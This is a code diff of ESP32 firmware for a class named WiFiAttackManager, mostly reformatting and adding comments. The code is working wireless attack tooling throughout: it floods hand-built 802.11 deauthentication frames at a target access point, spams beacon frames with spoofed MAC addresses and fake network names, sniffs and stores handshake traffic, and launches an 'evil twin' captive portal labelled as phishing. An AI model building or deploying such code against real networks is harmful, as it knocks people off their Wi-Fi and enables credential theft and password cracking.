@@ -6,15 +6,26 @@
 
 static WiFiAttackManager* g_wifiManager = nullptr;
 
-WiFiAttackManager::WiFiAttackManager() : _state(WiFiState::IDLE), _lastPacketTime(0), _packetsSent(0), _capturedHandshake(false) {
-    g_wifiManager = this; memset(_packetBuffer, 0, 128);
+WiFiAttackManager::WiFiAttackManager() : 
+    _state(WiFiState::IDLE), 
+    _lastPacketTime(0), 
+    _packetsSent(0), 
+    _capturedHandshake(false) 
+{
+    g_wifiManager = this; 
+    memset(_packetBuffer, 0, 128);
 }
 
-void WiFiAttackManager::setup() { WiFi.mode(WIFI_STA); WiFi.disconnect(); esp_wifi_set_ps(WIFI_PS_NONE); }
+void WiFiAttackManager::setup() { 
+    WiFi.mode(WIFI_STA); 
+    WiFi.disconnect(); 
+    esp_wifi_set_ps(WIFI_PS_NONE); // Максимальная производительность
+}
 
 void WiFiAttackManager::stop() {
     SdManager::getInstance().stopCapture();
     if (WebPortalManager::getInstance().isRunning()) WebPortalManager::getInstance().stop();
+    
     _state = WiFiState::IDLE;
     esp_wifi_set_promiscuous_rx_cb(nullptr);
     esp_wifi_set_promiscuous(false);
@@ -24,44 +35,64 @@ void WiFiAttackManager::stop() {
 
 void WiFiAttackManager::startScan() {
     if (_state != WiFiState::IDLE) return;
-    WiFi.scanNetworks(true); _state = WiFiState::SCANNING;
+    WiFi.scanNetworks(true); // Асинхронное сканирование
+    _state = WiFiState::SCANNING;
 }
 
 void WiFiAttackManager::startDeauth(const TargetAP& target) {
-    _currentTarget = target; _packetsSent = 0; _capturedHandshake = false;
+    _currentTarget = target; 
+    _packetsSent = 0; 
+    _capturedHandshake = false;
+    
     SdManager::getInstance().startCapture();
+    
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_channel(_currentTarget.channel, WIFI_SECOND_CHAN_NONE);
     esp_wifi_set_promiscuous_rx_cb(&WiFiAttackManager::snifferHandler);
+    
     buildDeauthPacket();
     _state = WiFiState::ATTACKING_DEAUTH;
 }
 
-void WiFiAttackManager::startBeaconSpam() { _packetsSent = 0; esp_wifi_set_promiscuous(true); _state = WiFiState::ATTACKING_BEACON; }
+void WiFiAttackManager::startBeaconSpam() { 
+    _packetsSent = 0; 
+    esp_wifi_set_promiscuous(true); 
+    _state = WiFiState::ATTACKING_BEACON; 
+}
 
 void WiFiAttackManager::startEvilTwin(const TargetAP& target) {
-    _currentTarget = target; _state = WiFiState::ATTACKING_EVIL_TWIN;
+    _currentTarget = target; 
+    _state = WiFiState::ATTACKING_EVIL_TWIN;
     esp_wifi_set_promiscuous(false);
     WebPortalManager::getInstance().start(target.ssid);
 }
 
 void WiFiAttackManager::buildDeauthPacket() {
+    // Формирование стандартного Deauth фрейма (Reason Code: 1)
     memset(_packetBuffer, 0, 26);
-    _packetBuffer[0] = 0xC0; _packetBuffer[1] = 0x00; _packetBuffer[2] = 0x3A; _packetBuffer[3] = 0x01;
-    memset(&_packetBuffer[4], 0xFF, 6);
-    memcpy(&_packetBuffer[10], _currentTarget.bssid, 6);
-    memcpy(&_packetBuffer[16], _currentTarget.bssid, 6);
-    _packetBuffer[24] = 0x00; _packetBuffer[25] = 0x00;
+    _packetBuffer[0] = 0xC0; _packetBuffer[1] = 0x00; // Type: Deauth
+    _packetBuffer[2] = 0x3A; _packetBuffer[3] = 0x01; // Duration
+    memset(&_packetBuffer[4], 0xFF, 6); // Dest: Broadcast
+    memcpy(&_packetBuffer[10], _currentTarget.bssid, 6); // Source: AP
+    memcpy(&_packetBuffer[16], _currentTarget.bssid, 6); // BSSID: AP
+    _packetBuffer[24] = 0x00; _packetBuffer[25] = 0x00; // Sequence number
 }
 
 void WiFiAttackManager::buildBeaconPacket(const char* ssid) {
     int len = strlen(ssid); if (len > 32) len = 32;
     memset(_packetBuffer, 0, 128);
-    _packetBuffer[0] = 0x80; _packetBuffer[1] = 0x00;
-    memset(&_packetBuffer[4], 0xFF, 6);
+    _packetBuffer[0] = 0x80; _packetBuffer[1] = 0x00; // Type: Beacon
+    memset(&_packetBuffer[4], 0xFF, 6); // Dest: Broadcast
+    
+    // Fake Source MAC
     for(int i=10;i<16;i++) _packetBuffer[i] = random(0,255);
-    memcpy(&_packetBuffer[16], &_packetBuffer[10], 6);
-    _packetBuffer[32] = 0x64; _packetBuffer[33] = 0x00; _packetBuffer[34] = 0x01; _packetBuffer[35] = 0x00;
+    memcpy(&_packetBuffer[16], &_packetBuffer[10], 6); // BSSID = Source
+    
+    // Fixed Parameters (Timestamp, Interval, CapInfo)
+    _packetBuffer[32] = 0x64; _packetBuffer[33] = 0x00; 
+    _packetBuffer[34] = 0x01; _packetBuffer[35] = 0x00;
+    
+    // Tagged Parameters: SSID
     _packetBuffer[36] = 0x00; _packetBuffer[37] = len;
     memcpy(&_packetBuffer[38], ssid, len);
 }
@@ -69,6 +100,8 @@ void WiFiAttackManager::buildBeaconPacket(const char* ssid) {
 void IRAM_ATTR WiFiAttackManager::snifferHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
     if (type != WIFI_PKT_DATA) return;
     const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+    
+    // Проверка длины и сохранение
     if (pkt->rx_ctrl.sig_len < 36 || pkt->rx_ctrl.sig_len > Config::MAX_PACKET_LEN) return;
     SdManager::getInstance().enqueuePacketFromISR(pkt->payload, pkt->rx_ctrl.sig_len);
 }
@@ -81,7 +114,6 @@ bool WiFiAttackManager::loop(StatusMessage& statusOut) {
         WebPortalManager::getInstance().processDns();
         statusOut.state = SystemState::ATTACKING_EVIL_TWIN;
         snprintf(statusOut.logMsg, MAX_LOG_MSG, "Phishing: %s", _currentTarget.ssid);
-        // Небольшая задержка, чтобы не вешать ядро веб-сервером
         vTaskDelay(pdMS_TO_TICKS(5));
         return true; 
     }
@@ -89,18 +121,32 @@ bool WiFiAttackManager::loop(StatusMessage& statusOut) {
     if (_state == WiFiState::SCANNING) {
         statusOut.state = SystemState::SCANNING;
         int n = WiFi.scanComplete();
-        if (n >= 0) { _state = WiFiState::SCAN_COMPLETE; snprintf(statusOut.logMsg, MAX_LOG_MSG, "Found: %d", n); }
-        else if (n == -2) WiFi.scanNetworks(true);
-        else snprintf(statusOut.logMsg, MAX_LOG_MSG, "Scanning...");
+        if (n >= 0) { 
+            _state = WiFiState::SCAN_COMPLETE; 
+            snprintf(statusOut.logMsg, MAX_LOG_MSG, "Found: %d", n); 
+        }
+        else if (n == -2) {
+            WiFi.scanNetworks(true); // Restart scan if failed
+        }
+        else {
+            snprintf(statusOut.logMsg, MAX_LOG_MSG, "Scanning...");
+        }
         return true;
     }
     
-    if (_state == WiFiState::SCAN_COMPLETE) { statusOut.state = SystemState::SCAN_COMPLETE; return false; }
+    if (_state == WiFiState::SCAN_COMPLETE) { 
+        statusOut.state = SystemState::SCAN_COMPLETE; 
+        return false; 
+    }
 
     if (_state == WiFiState::ATTACKING_DEAUTH) {
-        statusOut.state = SystemState::ATTACKING_WIFI;
+        statusOut.state = SystemState::ATTACKING_WIFI_DEAUTH; // Updated Enum
+        // Отправка пакетов пачками каждые 10мс
         if (now - _lastPacketTime > 10) {
-            for(int i=0; i<3; i++) { esp_wifi_80211_tx(WIFI_IF_STA, _packetBuffer, 26, false); _packetsSent++; }
+            for(int i=0; i<3; i++) { 
+                esp_wifi_80211_tx(WIFI_IF_STA, _packetBuffer, 26, false); 
+                _packetsSent++; 
+            }
             _lastPacketTime = now;
         }
         statusOut.packetsSent = _packetsSent;
@@ -109,10 +155,12 @@ bool WiFiAttackManager::loop(StatusMessage& statusOut) {
     }
 
     if (_state == WiFiState::ATTACKING_BEACON) {
-        statusOut.state = SystemState::ATTACKING_BEACON;
+        statusOut.state = SystemState::ATTACKING_WIFI_SPAM; // Updated Enum
+        // Смена SSID каждые 50мс
         if (now - _lastPacketTime > 50) {
             buildBeaconPacket(_spamSSIDs[random(0, _spamSSIDs.size())]);
-            esp_wifi_80211_tx(WIFI_IF_STA, _packetBuffer, 60, false); _packetsSent++;
+            esp_wifi_80211_tx(WIFI_IF_STA, _packetBuffer, 60, false); 
+            _packetsSent++;
             _lastPacketTime = now;
         }
         snprintf(statusOut.logMsg, MAX_LOG_MSG, "Beacon Spam");
@@ -127,9 +175,11 @@ std::vector<TargetAP> WiFiAttackManager::getScanResults() {
     if (n > 0) {
         for (int i = 0; i < min(n, 30); ++i) {
             TargetAP ap;
-            strncpy(ap.ssid, WiFi.SSID(i).c_str(), 32); ap.ssid[32]=0;
+            strncpy(ap.ssid, WiFi.SSID(i).c_str(), 32); 
+            ap.ssid[32] = 0;
             memcpy(ap.bssid, WiFi.BSSID(i), 6);
-            ap.channel = WiFi.channel(i); ap.rssi = WiFi.RSSI(i);
+            ap.channel = WiFi.channel(i); 
+            ap.rssi = WiFi.RSSI(i);
             results.push_back(ap);
         }
     }
